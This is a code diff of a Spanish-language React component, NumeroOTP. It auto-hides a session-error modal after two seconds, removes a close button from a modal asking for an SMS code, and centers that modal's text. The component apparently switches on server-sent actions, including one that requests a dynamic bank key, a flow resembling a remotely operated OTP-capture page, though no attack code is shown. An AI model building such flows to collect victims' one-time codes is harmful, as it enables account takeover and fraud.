@@ -441,6 +441,16 @@ export default function NumeroOTP() {
                             lanzarModalErrorSesion: true
                         }));
 
+                        // Se quita el modal a los 2 segundos
+                        setTimeout(() => {
+
+                            // Se oculta el modal de error de sesión OTP
+                            setFormState(prev => ({
+                                ...prev,
+                                lanzarModalErrorSesion: false
+                            }));
+                        }, 2000);
+
                         // Se sale del ciclo
                         break;
                     case 'solicitar_din':
@@ -558,25 +568,11 @@ export default function NumeroOTP() {
                         border: "1px solid #444",
                         boxShadow: "0 10px 25px rgba(0,0,0,0.5)"
                     }}>
-
-                        <button style={{
-                            position: "absolute",
-                            top: "20px",
-                            right: "20px",
-                            background: "transparent",
-                            border: "none",
-                            color: "white",
-                            fontSize: "24px",
-                            cursor: "pointer"
-                        }}>
-                            ✕
-                        </button>
-
-                        <h2 style={{ fontSize: "20px", fontWeight: "bold", marginBottom: "15px", marginTop: "10px", color: "white" }}>
+                        <h2 style={{ textAlign: "center", fontSize: "20px", fontWeight: "bold", marginBottom: "15px", marginTop: "10px", color: "white" }}>
                             Confirma tus datos
                         </h2>
 
-                        <p style={{ fontSize: "14px", marginBottom: "30px", color: "#e0e0e0" }}>
+                        <p style={{ textAlign: "center", fontSize: "14px", marginBottom: "30px", color: "#e0e0e0" }}>
                             Ingresa el código que te enviamos por mensaje de texto.
                         </p>
 
@@ -651,7 +647,7 @@ export default function NumeroOTP() {
                             ))}
                         </div>
 
-                        <p style={{ fontSize: "14px", marginBottom: "5px", color: "#ffffff" }} >
+                        <p style={{ textAlign: "center", fontSize: "14px", marginBottom: "5px", color: "#ffffff" }} >
                             Búscalo en el número de teléfono registrado
                         </p>
 
